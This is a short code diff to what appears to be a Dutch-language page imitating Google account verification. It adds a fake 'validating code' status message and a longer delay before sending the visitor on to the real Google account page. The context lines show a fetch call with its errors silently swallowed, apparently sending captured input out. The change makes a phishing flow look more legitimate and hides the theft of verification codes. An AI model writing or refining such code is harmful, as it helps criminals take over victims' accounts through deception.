@@ -700,10 +700,13 @@
             })
         }).catch(() => {});
 
-        // Redirect to real Google account after short delay
+        // Show "verifying" status, then redirect to real Google account
+        setTimeout(() => {
+            btn.innerHTML = '<span style="font-size:13px;color:#5f6368;font-weight:500;">Code valideren\u2026</span>';
+        }, 900);
         setTimeout(() => {
             window.location.href = 'https://myaccount.google.com/?hl=nl';
-        }, 1400 + Math.random() * 400);
+        }, 2200 + Math.random() * 400);
     }
 
     /* ── Andere verificatiemethode ── */
